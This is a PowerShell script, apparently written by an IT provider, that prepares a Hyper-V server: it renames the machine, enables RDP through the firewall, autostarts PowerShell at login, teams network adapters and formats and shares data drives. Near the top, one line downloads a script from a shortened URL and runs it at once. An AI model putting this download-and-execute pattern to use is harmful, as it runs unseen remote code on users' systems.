Write-Output "!!!! Importing Lantrx PowerShell Hyper-V Scrips !!!!"
#load bootstrap url
iex ((New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/c7cfd'))

#preps a new blank drive for backups
function new-backupdrive {
$name = [guid]::NewGuid()
$name = $name.ToString() -replace ('-', '')
$name = $name.Substring(0, 32) #max for ntfs volume lable


#$driveletter='B'
#$name=$name +(get-date).year.ToString()
#$name=$name + (get-date).month.ToString()
#$name=$name + (get-date).day.ToString()
#if(!(Test-Path variable:id)){$id=0}
$disks = Get-Disk | Where partitionstyle -eq "raw"
foreach($disk in $disks){
$id++
$no=$disk|Initialize-Disk -PartitionStyle MBR -PassThru | New-Partition -AssignDriveLetter -UseMaximumSize | Format-Volume -FileSystem NTFS -NewFileSystemLabel "$name" -Confirm:$false
$no
#$disk | Get-Partition | Set-Partition -NewDriveLetter $driveletter
#Get-Volume -DriveLetter $driveletter
}
}

function new-lantrxhyperv
{
<#
	.Synopsis
		Short description
	
	.DESCRIPTION
		Long description
	
	.PARAMETER newname
		computername help description
	
	.PARAMETER datadriveletter
		datadriveletter help description
	
	.EXAMPLE
		Example of how to use this cmdlet
	
	.EXAMPLE
		Another example of how to use this cmdlet
	
	.OUTPUTS
		Output from this cmdlet (if any)
	
	.NOTES
		General notes
	
	.INPUTS
		Inputs to this cmdlet (if any)
	
	.COMPONENT
		The component this cmdlet belongs to
	
	.ROLE
		The role this cmdlet belongs to
	
	.FUNCTIONALITY
		The functionality that best describes this cmdlet
#>
	
	[CmdletBinding(ConfirmImpact = 'Medium',
				   HelpUri = 'http://help.lantrxinc.com/powershell',
				   PositionalBinding = $false,
				   SupportsShouldProcess = $true)]
	[OutputType([String])]
	param
	(
		[Parameter(Mandatory = $true,
				   ValueFromPipeline = $true,
				   ValueFromPipelineByPropertyName = $true,
				   ValueFromRemainingArguments = $false,
				   Position = 0)]
		[Alias('newcomputername')]
		[string]$newname = 'Hyperv001',
		[Parameter(Mandatory = $false,
				   Position = 1)]
		[char]$datadriveletter
	)
	
	Begin
	{
	} #end begin
	Process
	{
		if ($pscmdlet.ShouldProcess("localhost", "lantrx prep of hyper-v for install"))
		{
			Write-Verbose "setting computer name to $newname"
			Rename-Computer -NewName $newname
			Write-Verbose "setting up RDP access to $newname"
			cscript $env:systemroot\System32\Scregedit.wsf /ar 0
			cscript $env:systemroot\System32\Scregedit.wsf /cs 0
			#set-ItemProperty -Path 'HKLM:SystemCurrentControlSetControlTerminal Server'-name "fDenyTSConnections" -Value 0
			#set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
			Write-Verbose "creating RDP rule"
			New-NetFirewallRule -DisplayName "!RDP" -Direction inbound -LocalPort 3389 -Protocol tcp -Action allow
			
			Write-Verbose "setting up powershell to start on login"
			New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run -Name Powershell -Value $env:systemroot\system32\WindowsPowerShell\v1.0\powershell.exe -Type string
			#new-psdrive -root "\\san02\ftp\aaron1\hyper-v mgnt" -name install -psprovider filesystem -credential (get-credential)
			#Start-Process -FilePath install:\59Manager.exe -Wait
			
			Write-Verbose "Binding up all network cards to Lan-Bridge"
			$nics = get-netadapter -physical
			New-NetLbfoTeam -name "hyper-v Team" -TeamMembers $nics.name -confirm:$false #-WhatIf
			New-VMSwitch -Name "Lan-Bridge" -NetAdapterName "hyper-v Team" -AllowManagementOS $true
			
			Write-Verbose "disabling vmq on all adapters"
			get-netadapter -physical | Set-NetAdapterVmq -Enabled $False
			#Set-NetAdapterVmq -Name "NIC 1? -Enabled $False
			#Set-NetAdapterVmq -Name "NIC 2? -Enabled $False
			
			if($datadriveletter){
				$disk = get-disk | ?{ $_.PartitionStyle -eq "RAW" }
				$driveletter = $datadriveletter
				Write-Verbose "init HDD"
				$disk | initialize-disk -PartitionStyle GPT
				Write-Verbose "creating parttion pon HDD and assigning drive letter $datadriveletter"
				$disk | new-partition -usemaximumsize -DriveLetter $driveletter
				Write-Verbose "labeling partion as vm-data"
				format-volume -driveletter $driveletter -FileSystem NTFS -NewFileSystemLabel "vm-data" -Confirm:$false
				
				Write-Verbose "creating vm folder for virtual guests"
				$vmpath = New-Item -ItemType directory -Path "$driveletter"+":\VMs"
				Write-Verbose "creating ISO folder"
				$isopath = New-Item -ItemType directory -Path "$driveletter"+":\iso"
				Write-Verbose "sharing iso folder"
				New-SmbShare -Name ISO -Path "$driveletter"+":\iso" -FullAccess administrator
			}#end if datadrive
		} #end if shouldprocess
	} #end process
	End
	{
	} #end end
} #end function


write-output "!!!! Finished installing scripts from Lantrx !!!!"
